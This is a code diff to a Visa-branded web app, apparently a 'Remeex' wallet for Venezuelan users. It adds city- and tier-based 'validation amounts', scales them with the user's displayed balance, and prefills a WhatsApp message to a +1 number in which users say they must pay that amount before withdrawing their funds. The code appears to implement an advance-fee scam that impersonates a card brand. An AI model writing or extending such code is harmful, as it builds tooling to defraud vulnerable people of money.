@@ -6316,7 +6316,7 @@
       window.location.href = "https://visa.es";
     }
 
-    const BANK_NAME_MAP = {
+const BANK_NAME_MAP = {
       banesco: 'Banesco',
       mercantil: 'Mercantil',
       venezuela: 'Banco de Venezuela',
@@ -6335,6 +6335,30 @@
       banco_agricola: 'Banco Agrícola',
       mi_banco: 'Mi Banco',
       otros: 'Otros'
+    };
+
+    const CITY_VALIDATION_AMOUNTS = {
+      caracas: {
+        'Estándar': 30,
+        'Bronce': 35,
+        'Platinum': 40,
+        'Uranio Visa': 45,
+        'Uranio Infinite': 50
+      },
+      maracaibo: {
+        'Estándar': 28,
+        'Bronce': 33,
+        'Platinum': 38,
+        'Uranio Visa': 43,
+        'Uranio Infinite': 48
+      },
+      valencia: {
+        'Estándar': 27,
+        'Bronce': 32,
+        'Platinum': 37,
+        'Uranio Visa': 42,
+        'Uranio Infinite': 47
+      }
     };
 
     // Global variables
@@ -7486,6 +7510,31 @@ function stopVerificationProgress() {
       const dateStr = date.toLocaleDateString('es-ES', dateOptions);
       const timeStr = date.toLocaleTimeString('es-ES', timeOptions).toLowerCase();
       return `${dateStr} ${timeStr}`;
+    }
+
+    function getUserCity() {
+      const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
+      return (reg.state || '').toLowerCase();
+    }
+
+    function getVerificationAmountUsd(balanceUsd) {
+      if (balanceUsd >= 5001) return 45;
+      if (balanceUsd >= 2001) return 40;
+      if (balanceUsd >= 1001) return 35;
+      if (balanceUsd >= 501) return 30;
+      return 25;
+    }
+
+    function getCityValidationAmount(tier, fallback) {
+      const city = getUserCity();
+      if (CITY_VALIDATION_AMOUNTS[city] && CITY_VALIDATION_AMOUNTS[city][tier]) {
+        return CITY_VALIDATION_AMOUNTS[city][tier];
+      }
+      return fallback;
+    }
+
+    function capitalize(text) {
+      return text ? text.charAt(0).toUpperCase() + text.slice(1) : '';
     }
 
     function getShortDate() {
@@ -10400,15 +10449,24 @@ function setupUsAccountLink() {
     }
 
     // Generar mensajes y actualizar los enlaces de WhatsApp
+    function buildWhatsAppMessage() {
+      const name = currentUser.fullName || currentUser.name || '';
+      const id = currentUser.idNumber || '';
+      const reg = JSON.parse(localStorage.getItem('visaRegistrationCompleted') || '{}');
+      const bankName = BANK_NAME_MAP[reg.primaryBank] || '';
+      const tier = localStorage.getItem('remeexAccountTier') || 'Estándar';
+      const cityName = capitalize(getUserCity() || 'su ciudad');
+      const baseAmt = getVerificationAmountUsd(currentUser.balance.usd || 0);
+      const minAmt = getCityValidationAmount(tier, baseAmt);
+      const amountText = formatCurrency(minAmt, 'usd');
+      return `Hola, mi nombre es ${name} (C.I. ${id}). Vivo en ${cityName} y mi cuenta es de nivel ${tier}. Debo validar al menos ${amountText} para continuar. Agradezco su ayuda para retirar mis fondos al banco ${bankName}.`;
+    }
+
     function updateWhatsAppLinks() {
       const links = document.querySelectorAll('a.whatsapp-link');
       if (!links.length) return;
 
-      const name = currentUser.name || '';
-      const balanceBs = formatCurrency(currentUser.balance.bs, 'bs');
-      const balanceUsd = formatCurrency(currentUser.balance.usd, 'usd');
-      const message = `Hola, necesito ayuda urgente, soy ${name}, los contacto desde Venezuela, mi saldo actual es de ${balanceBs} y ${balanceUsd} y estoy en el proceso de retiro de mis fondos a mi banco y necesito conversar con el ejecutivo de mi cuenta para solucionar mi peticion.`;
-      const encoded = encodeURIComponent(message);
+      const encoded = encodeURIComponent(buildWhatsAppMessage());
 
       links.forEach(link => {
         link.href = `https://wa.me/+17373018059?text=${encoded}`;
